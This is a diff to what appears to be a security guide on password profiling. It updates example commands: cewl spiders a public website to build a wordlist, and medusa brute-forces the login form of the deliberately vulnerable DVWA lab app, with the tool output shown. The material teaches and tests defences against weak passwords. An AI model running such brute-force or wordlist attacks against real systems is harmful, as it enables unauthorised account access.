@@ -197,7 +197,7 @@ The general usage is (from the terminal) like:
     # -d specifies depth to spider the url
     # -w <ouput file path>
     # -m <minimum word length to record>
-    cewl -d 5 -m 3 -w ~/cewl-wordlist.txt <target url>
+    cewl -d 2 -m 3 -w ~/cewl-bob-wordlist.txt www.bobthebuilder.com/en-us/
     # If you go deep, it can take a very long time.
 
 Now what you can do with the wordlist produced is augment it with the likes of [crunch](#people-identify-risks-weak-password-strategies-password-profiling-crunch) to add some extra characters that people often add or even [cupp](#people-identify-risks-weak-password-strategies-password-profiling-cupp) to make the passwords a bit more personal.
@@ -406,7 +406,8 @@ Choose your module and get more information on it:
 Against the DVWA in the OWASPBWA suite, I used the following command:
 
 {linenos=off, lang=bash}
-    medusa -h 192.168.56.22 -u admin -P /root/wordlist-cewl-output-dvwa \
+    # Using our wordlist generated from CUPP from above
+    medusa -h 192.168.56.22 -u Bob -P /opt/cupp/bob.txt \
     -M web-form -m FORM:"/dvwa/login.php" -m DENY-SIGNAL:"login.php" \
     -m FORM-DATA:"post?username=&password=&Login=Login"
 
@@ -414,9 +415,9 @@ Against the DVWA in the OWASPBWA suite, I used the following command:
     Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
     ERROR: The answer was NOT successfully received, understood, and accepted while trying \
-    admin cats: error code  302
+    bob 0010115: error code  302
     ACCOUNT CHECK: [web-form] Host: 192.168.56.22 (1 of 1, 0 complete) \
-    User: admin (1 of 1, 0 complete) Password: cats (1 of 4 complete)
+    User: bob (1 of 1, 0 complete) Password: 0010115 (1 of 31546 complete)
 
 I also tried with just the correct password. The issue was that Medusa was not handling the redirects properly, so you end up with a `HTTP 302`
 
